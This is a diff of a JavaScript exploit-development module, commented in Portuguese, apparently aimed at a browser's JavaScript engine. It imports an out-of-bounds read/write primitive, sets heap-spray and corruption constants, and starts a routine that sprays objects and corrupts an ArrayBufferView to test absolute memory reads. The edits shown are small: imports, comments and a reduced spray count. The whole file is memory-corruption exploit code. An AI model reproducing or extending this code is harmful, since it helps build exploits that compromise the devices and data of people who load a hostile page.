@@ -1,10 +1,10 @@
 // js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object, KB } from '../utils.mjs'; // Adicionado KB para logs
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
-    oob_dataview_real, // <--- ADICIONADO AQUI
+    oob_dataview_real, // Importação corrigida
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
@@ -17,9 +17,9 @@ const FNAME_SPRAY_INVESTIGATE = "sprayAndCorruptABView_v9";
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x50;
+const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x50; // Baseado na análise de logs e offsets
 
-const NUM_SPRAY_OBJECTS = 20000;
+const NUM_SPRAY_OBJECTS = 200;
 const SPRAY_MARKER_VALUE_BASE = 0x41410000;
 const ADV64_ZERO = new AdvancedInt64(0, 0);
 const CORRUPTION_VALUE_UINT32_FFFFFFFF = 0xFFFFFFFF;
@@ -28,14 +28,13 @@ const CORRUPTION_VALUE_UINT32_FFFFFFFF = 0xFFFFFFFF;
 // ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
 let sprayedVictimObjects = [];
 
-export async function sprayAndInvestigateObjectExposure() { // O nome da função exportada permanece o mesmo
+export async function sprayAndInvestigateObjectExposure() {
     logS3(`--- Iniciando ${FNAME_SPRAY_INVESTIGATE}: Corromper ArrayBufferView e Testar Leitura Absoluta ---`, "test", FNAME_SPRAY_INVESTIGATE);
 
     try {
         await triggerOOB_primitive();
-        // A linha do erro original (37) estaria próxima a esta verificação:
-        if (!oob_array_buffer_real || !oob_dataview_real) { // Agora oob_dataview_real deve estar definido
-            logS3("Falha ao inicializar o ambiente OOB. oob_array_buffer_real ou oob_dataview_real não estão definidos após triggerOOB_primitive.", "critical", FNAME_SPRAY_INVESTIGATE);
+        if (!oob_array_buffer_real || !oob_dataview_real) {
+            logS3("Falha ao inicializar o ambiente OOB. oob_array_buffer_real ou oob_dataview_real não estão definidos.", "critical", FNAME_SPRAY_INVESTIGATE);
             return;
         }
         logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);
